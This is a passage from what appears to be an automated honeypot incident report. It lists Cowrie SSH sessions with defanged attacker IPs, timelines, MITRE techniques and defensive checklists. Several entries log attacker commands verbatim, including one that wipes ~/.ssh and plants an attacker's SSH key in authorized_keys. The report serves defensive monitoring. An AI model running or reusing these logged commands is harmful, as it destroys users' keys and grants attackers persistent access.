- [ ] Block `14.47.200[.]242` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82fb9eca7121

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-29 14:14 |
| **Last Seen** | 2026-08-29 14:14 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 14:14:11` | `cowrie.session.connect` |
| `2026-08-29 14:14:12` | `cowrie.client.version` |
| `2026-08-29 14:14:12` | `cowrie.client.kex` |
| `2026-08-29 14:14:18` | `cowrie.login.success` |
| `2026-08-29 14:14:21` | `cowrie.session.params` |
| `2026-08-29 14:14:21` | `cowrie.command.input` |
| `2026-08-29 14:14:21` | `cowrie.command.input` |
| `2026-08-29 14:14:21` | `cowrie.command.input` |
| `2026-08-29 14:14:21` | `cowrie.command.input` |
| `2026-08-29 14:14:21` | `cowrie.command.input` |
| `2026-08-29 14:14:21` | `cowrie.command.success` |
| `2026-08-29 14:14:21` | `cowrie.command.input` |
| `2026-08-29 14:14:21` | `cowrie.command.input` |
| `2026-08-29 14:14:21` | `cowrie.command.input` |
| `2026-08-29 14:14:21` | `cowrie.command.input` |
| `2026-08-29 14:14:23` | `cowrie.log.closed` |
| `2026-08-29 14:14:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9f53e6adf33

| Field | Detail |
|---|---|
| **Source IP** | `210.177.143[.]61` |
| **First Seen** | 2026-08-29 14:15 |
| **Last Seen** | 2026-08-29 14:15 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 14:15:38` | `cowrie.session.connect` |
| `2026-08-29 14:15:39` | `cowrie.client.version` |
| `2026-08-29 14:15:39` | `cowrie.client.kex` |
| `2026-08-29 14:15:41` | `cowrie.login.success` |
| `2026-08-29 14:15:42` | `cowrie.direct-tcpip.request` |
| `2026-08-29 14:15:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.177.143[.]61` to AbuseIPDB if not already reported
- [ ] Block `210.177.143[.]61` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81ebb2e63ce3

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-29 14:16 |
| **Last Seen** | 2026-08-29 14:16 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 14:16:02` | `cowrie.session.connect` |
| `2026-08-29 14:16:04` | `cowrie.client.version` |
| `2026-08-29 14:16:04` | `cowrie.client.kex` |
| `2026-08-29 14:16:10` | `cowrie.login.success` |
| `2026-08-29 14:16:14` | `cowrie.session.params` |
| `2026-08-29 14:16:14` | `cowrie.command.input` |
| `2026-08-29 14:16:14` | `cowrie.command.input` |
| `2026-08-29 14:16:14` | `cowrie.command.input` |
| `2026-08-29 14:16:14` | `cowrie.command.input` |
| `2026-08-29 14:16:14` | `cowrie.command.input` |
| `2026-08-29 14:16:14` | `cowrie.command.success` |
| `2026-08-29 14:16:14` | `cowrie.command.input` |
| `2026-08-29 14:16:14` | `cowrie.command.input` |
| `2026-08-29 14:16:14` | `cowrie.command.input` |
| `2026-08-29 14:16:14` | `cowrie.command.input` |
| `2026-08-29 14:16:16` | `cowrie.log.closed` |
| `2026-08-29 14:16:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc4546643680

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-29 14:17 |
| **Last Seen** | 2026-08-29 14:18 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 14:17:59` | `cowrie.session.connect` |
| `2026-08-29 14:18:01` | `cowrie.client.version` |
| `2026-08-29 14:18:01` | `cowrie.client.kex` |
| `2026-08-29 14:18:07` | `cowrie.login.success` |
| `2026-08-29 14:18:10` | `cowrie.session.params` |
| `2026-08-29 14:18:10` | `cowrie.command.input` |
| `2026-08-29 14:18:10` | `cowrie.command.input` |
| `2026-08-29 14:18:10` | `cowrie.command.input` |
| `2026-08-29 14:18:10` | `cowrie.command.input` |
| `2026-08-29 14:18:10` | `cowrie.command.input` |
| `2026-08-29 14:18:10` | `cowrie.command.success` |
| `2026-08-29 14:18:10` | `cowrie.command.input` |
| `2026-08-29 14:18:10` | `cowrie.command.input` |
| `2026-08-29 14:18:10` | `cowrie.command.input` |
| `2026-08-29 14:18:10` | `cowrie.command.input` |
| `2026-08-29 14:18:12` | `cowrie.log.closed` |
| `2026-08-29 14:18:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82592e809e28

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 14:18 |
| **Last Seen** | 2026-08-29 14:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 14:18:46` | `cowrie.session.connect` |
| `2026-08-29 14:18:46` | `cowrie.client.version` |
| `2026-08-29 14:18:46` | `cowrie.client.kex` |
| `2026-08-29 14:18:47` | `cowrie.login.success` |
| `2026-08-29 14:18:47` | `cowrie.direct-tcpip.request` |
| `2026-08-29 14:18:47` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 14:18:47` | `cowrie.direct-tcpip.data` |
| `2026-08-29 14:18:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3fc6d11431bf

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-29 14:19 |
| **Last Seen** | 2026-08-29 14:20 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 14:19:54` | `cowrie.session.connect` |
| `2026-08-29 14:19:55` | `cowrie.client.version` |
| `2026-08-29 14:19:55` | `cowrie.client.kex` |
| `2026-08-29 14:19:59` | `cowrie.login.success` |
| `2026-08-29 14:20:02` | `cowrie.session.params` |
| `2026-08-29 14:20:02` | `cowrie.command.input` |
| `2026-08-29 14:20:02` | `cowrie.command.input` |
| `2026-08-29 14:20:02` | `cowrie.command.input` |
| `2026-08-29 14:20:02` | `cowrie.command.input` |
| `2026-08-29 14:20:02` | `cowrie.command.input` |
| `2026-08-29 14:20:02` | `cowrie.command.success` |
| `2026-08-29 14:20:02` | `cowrie.command.input` |
| `2026-08-29 14:20:02` | `cowrie.command.input` |
| `2026-08-29 14:20:02` | `cowrie.command.input` |
| `2026-08-29 14:20:02` | `cowrie.command.input` |
| `2026-08-29 14:20:03` | `cowrie.log.closed` |
| `2026-08-29 14:20:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3edd2c359488

| Field | Detail |
|---|---|
| **Source IP** | `120.48.118[.]142` |
| **First Seen** | 2026-08-29 14:20 |
| **Last Seen** | 2026-08-29 14:25 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 14:20:13` | `cowrie.session.connect` |
| `2026-08-29 14:20:13` | `cowrie.client.version` |
| `2026-08-29 14:20:13` | `cowrie.client.kex` |
| `2026-08-29 14:20:14` | `cowrie.login.success` |
| `2026-08-29 14:20:15` | `cowrie.session.params` |
| `2026-08-29 14:20:15` | `cowrie.command.input` |
| `2026-08-29 14:20:15` | `cowrie.command.failed` |
| `2026-08-29 14:20:16` | `cowrie.log.closed` |
| `2026-08-29 14:25:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.118[.]142` to AbuseIPDB if not already reported
- [ ] Block `120.48.118[.]142` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-313fe8228a00

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 14:22 |
| **Last Seen** | 2026-08-29 14:22 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 14:22:51` | `cowrie.session.connect` |
| `2026-08-29 14:22:51` | `cowrie.client.version` |
| `2026-08-29 14:22:51` | `cowrie.client.kex` |
| `2026-08-29 14:22:53` | `cowrie.login.success` |
| `2026-08-29 14:22:53` | `cowrie.direct-tcpip.request` |
| `2026-08-29 14:22:54` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 14:22:54` | `cowrie.direct-tcpip.data` |
| `2026-08-29 14:22:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bca5b6baee84

| Field | Detail |
|---|---|
| **Source IP** | `103.86.198[.]253` |
| **First Seen** | 2026-08-29 14:22 |
| **Last Seen** | 2026-08-29 14:23 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 14:22:57` | `cowrie.session.connect` |
| `2026-08-29 14:22:57` | `cowrie.client.version` |
| `2026-08-29 14:22:57` | `cowrie.client.kex` |
| `2026-08-29 14:22:58` | `cowrie.login.success` |
| `2026-08-29 14:22:59` | `cowrie.session.params` |
| `2026-08-29 14:22:59` | `cowrie.command.input` |
| `2026-08-29 14:22:59` | `cowrie.command.failed` |
| `2026-08-29 14:22:59` | `cowrie.log.closed` |
| `2026-08-29 14:23:00` | `cowrie.session.params` |
| `2026-08-29 14:23:00` | `cowrie.command.input` |
| `2026-08-29 14:23:00` | `cowrie.session.file_download` |
| `2026-08-29 14:23:00` | `cowrie.log.closed` |
| `2026-08-29 14:23:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.86.198[.]253` to AbuseIPDB if not already reported
- [ ] Block `103.86.198[.]253` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63c70ffe1f75

| Field | Detail |
|---|---|
| **Source IP** | `103.86.198[.]253` |
| **First Seen** | 2026-08-29 14:23 |
| **Last Seen** | 2026-08-29 14:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 14:23:01` | `cowrie.session.connect` |
| `2026-08-29 14:23:01` | `cowrie.client.version` |
| `2026-08-29 14:23:01` | `cowrie.client.kex` |
| `2026-08-29 14:23:02` | `cowrie.login.success` |
| `2026-08-29 14:23:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.86.198[.]253` to AbuseIPDB if not already reported
- [ ] Block `103.86.198[.]253` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34478e639d7a

| Field | Detail |
|---|---|
| **Source IP** | `103.86.198[.]253` |
| **First Seen** | 2026-08-29 14:23 |
| **Last Seen** | 2026-08-29 14:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 14:23:02` | `cowrie.session.connect` |
| `2026-08-29 14:23:02` | `cowrie.client.version` |
| `2026-08-29 14:23:03` | `cowrie.client.kex` |
| `2026-08-29 14:23:04` | `cowrie.login.success` |
| `2026-08-29 14:23:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.86.198[.]253` to AbuseIPDB if not already reported
- [ ] Block `103.86.198[.]253` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f17e4de329c

| Field | Detail |
|---|---|
| **Source IP** | `161.132.54[.]218` |
| **First Seen** | 2026-08-29 14:24 |
| **Last Seen** | 2026-08-29 14:25 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 14:24:57` | `cowrie.session.connect` |
| `2026-08-29 14:24:57` | `cowrie.client.version` |
| `2026-08-29 14:24:57` | `cowrie.client.kex` |
| `2026-08-29 14:24:57` | `cowrie.login.success` |
| `2026-08-29 14:24:58` | `cowrie.session.params` |
| `2026-08-29 14:24:58` | `cowrie.command.input` |
| `2026-08-29 14:24:58` | `cowrie.command.failed` |
| `2026-08-29 14:24:58` | `cowrie.log.closed` |
| `2026-08-29 14:24:59` | `cowrie.session.params` |
| `2026-08-29 14:24:59` | `cowrie.command.input` |
| `2026-08-29 14:24:59` | `cowrie.session.file_download` |
| `2026-08-29 14:24:59` | `cowrie.log.closed` |
| `2026-08-29 14:25:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.132.54[.]218` to AbuseIPDB if not already reported
- [ ] Block `161.132.54[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dbbcc919ff43

| Field | Detail |
|---|---|
| **Source IP** | `161.132.54[.]218` |
| **First Seen** | 2026-08-29 14:24 |
| **Last Seen** | 2026-08-29 14:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 14:24:59` | `cowrie.session.connect` |
| `2026-08-29 14:24:59` | `cowrie.client.version` |
| `2026-08-29 14:24:59` | `cowrie.client.kex` |
| `2026-08-29 14:25:00` | `cowrie.login.success` |
| `2026-08-29 14:25:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.132.54[.]218` to AbuseIPDB if not already reported
- [ ] Block `161.132.54[.]218` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f60d34221595

| Field | Detail |
|---|---|
| **Source IP** | `161.132.54[.]218` |
| **First Seen** | 2026-08-29 14:25 |
| **Last Seen** | 2026-08-29 14:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 14:25:00` | `cowrie.session.connect` |
| `2026-08-29 14:25:00` | `cowrie.client.version` |
| `2026-08-29 14:25:00` | `cowrie.client.kex` |
| `2026-08-29 14:25:00` | `cowrie.login.success` |
| `2026-08-29 14:25:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.132.54[.]218` to AbuseIPDB if not already reported
- [ ] Block `161.132.54[.]218` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-50441c926f7d

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 14:28 |
| **Last Seen** | 2026-08-29 14:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 14:28:35` | `cowrie.session.connect` |
| `2026-08-29 14:28:35` | `cowrie.client.version` |
| `2026-08-29 14:28:35` | `cowrie.client.kex` |
| `2026-08-29 14:28:36` | `cowrie.login.success` |
| `2026-08-29 14:28:36` | `cowrie.direct-tcpip.request` |
| `2026-08-29 14:28:36` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 14:28:36` | `cowrie.direct-tcpip.data` |
| `2026-08-29 14:28:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18c757fba0b7

| Field | Detail |
|---|---|
| **Source IP** | `122.166.253[.]226` |
| **First Seen** | 2026-08-29 14:31 |
| **Last Seen** | 2026-08-29 14:31 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 14:31:16` | `cowrie.session.connect` |
| `2026-08-29 14:31:17` | `cowrie.client.version` |
| `2026-08-29 14:31:17` | `cowrie.client.kex` |
| `2026-08-29 14:31:19` | `cowrie.login.success` |
| `2026-08-29 14:31:20` | `cowrie.direct-tcpip.request` |
| `2026-08-29 14:31:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.166.253[.]226` to AbuseIPDB if not already reported
- [ ] Block `122.166.253[.]226` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0db279f014c2

| Field | Detail |
|---|---|
| **Source IP** | `186.238.242[.]194` |
| **First Seen** | 2026-08-29 14:31 |
| **Last Seen** | 2026-08-29 14:31 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 14:31:25` | `cowrie.session.connect` |
| `2026-08-29 14:31:26` | `cowrie.client.version` |
| `2026-08-29 14:31:26` | `cowrie.client.kex` |
| `2026-08-29 14:31:28` | `cowrie.login.success` |
| `2026-08-29 14:31:28` | `cowrie.direct-tcpip.request` |
| `2026-08-29 14:31:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.238.242[.]194` to AbuseIPDB if not already reported
- [ ] Block `186.238.242[.]194` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6598c2842a7e

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 14:33 |
| **Last Seen** | 2026-08-29 14:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 14:33:53` | `cowrie.session.connect` |
| `2026-08-29 14:33:53` | `cowrie.client.version` |
| `2026-08-29 14:33:53` | `cowrie.client.kex` |
| `2026-08-29 14:33:54` | `cowrie.login.success` |
| `2026-08-29 14:33:54` | `cowrie.direct-tcpip.request` |
| `2026-08-29 14:33:54` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 14:33:54` | `cowrie.direct-tcpip.data` |
| `2026-08-29 14:33:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3283aa8f5fc7

| Field | Detail |
|---|---|
| **Source IP** | `103.147.248[.]44` |
| **First Seen** | 2026-08-29 14:34 |
| **Last Seen** | 2026-08-29 14:34 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 14:34:48` | `cowrie.session.connect` |
| `2026-08-29 14:34:49` | `cowrie.client.version` |
| `2026-08-29 14:34:49` | `cowrie.client.kex` |
| `2026-08-29 14:34:51` | `cowrie.login.success` |
| `2026-08-29 14:34:52` | `cowrie.direct-tcpip.request` |
| `2026-08-29 14:34:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.147.248[.]44` to AbuseIPDB if not already reported
- [ ] Block `103.147.248[.]44` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
